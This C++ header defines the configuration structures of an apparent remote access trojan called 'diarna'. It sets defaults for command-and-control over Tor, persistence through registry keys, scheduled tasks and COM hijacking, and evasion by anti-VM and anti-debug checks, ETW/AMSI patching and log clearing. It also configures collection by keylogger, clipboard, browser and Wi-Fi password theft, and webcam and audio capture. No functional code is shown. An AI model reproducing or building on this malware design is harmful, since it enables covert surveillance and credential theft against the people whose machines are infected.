#pragma once
#include <diarna/compiler_port.hpp>
#include <string>
#include <vector>
#include <cstdint>
#include <array>
#include <chrono>

namespace diarna {

struct ServerEndpoint {
    std::string host;
    uint16_t port = 0;
    bool tls = false;
};

struct TorConfig {
    bool enabled = false;
    bool embedded = true;
    std::string socks5_host = "127.0.0.1";
    uint16_t socks5_port = 9050;
};

struct PersistenceConfig {
    bool registry_run = true;
    bool scheduled_task = true;
    bool windows_service = false;
    bool startup_folder = true;
    bool wmi_subscription = false;
    bool com_hijack = false;
    bool hide_taskmgr = true;
    bool mask_pid = true;
    bool critical_process = true;
    std::wstring task_name;
    std::wstring service_name;
    std::wstring service_display;
    std::wstring registry_key;
};

struct CaptureConfig {
    uint32_t screenshot_quality = 85;
    uint32_t webcam_device = 0;
    uint32_t webcam_width = 640;
    uint32_t webcam_height = 480;
    uint32_t audio_sample_rate = 44100;
    uint8_t audio_channels = 2;
    uint32_t stream_bitrate = 1500000;
    uint32_t stream_fps = 30;
};

struct CommConfig {
    std::vector<ServerEndpoint> servers;
    TorConfig tor;
    std::chrono::seconds reconnect{30};
    std::chrono::seconds heartbeat{60};
    std::chrono::seconds initial_delay{5};
    bool jitter = true;
    uint32_t jitter_pct = 25;
    uint32_t max_retries = 10;
    bool kill_date_enabled = false;
    std::string kill_date;
};

struct ExecConfig {
    std::chrono::seconds cmd_timeout{300};
    bool capture_output = true;
};

struct StealthConfig {
    bool anti_vm = true;
    bool anti_debug = true;
    bool anti_sandbox = true;
    bool anti_anyrun = true;
    bool anti_hook = true;
    bool patch_etw = true;
    bool patch_amsi = true;
    bool clear_logs = true;
    bool clear_prefetch = true;
    bool clear_recent = true;
    bool unlink_peb = true;
    bool vault_memory = true;
    bool obfuscate_constants = true;
    bool behave_defensively = false;
};

struct CollectionConfig {
    bool keylogger = true;
    bool clipboard = true;
    bool wifi_passwords = false;
    bool browser_passwords = false;
    bool rdp_connections = false;
    bool screenshot_periodic = false;
    uint32_t screenshot_interval_sec = 30;
    uint32_t keylog_flush_sec = 30;
};

struct EnvironmentKey {
    bool enabled = false;
    std::vector<std::string> wifi_ssids;
    std::vector<std::string> usb_vid_pid;
    std::string timezone;
    uint32_t min_uptime_minutes = 0;
    std::string required_date;
    std::string expire_date;
    bool check_all = true;
};

struct Config {
    CommConfig comm;
    PersistenceConfig persistence;
    CaptureConfig capture;
    ExecConfig exec;
    StealthConfig stealth;
    CollectionConfig collection;
    EnvironmentKey environment;
    std::string agent_id;
    std::array<uint8_t, 32> encryption_key{};
    bool daemonize = true;
    bool tor_primary = false;
    std::string proxy_url;
};

inline Config default_config() {
    return Config{};
}

} // namespace diarna
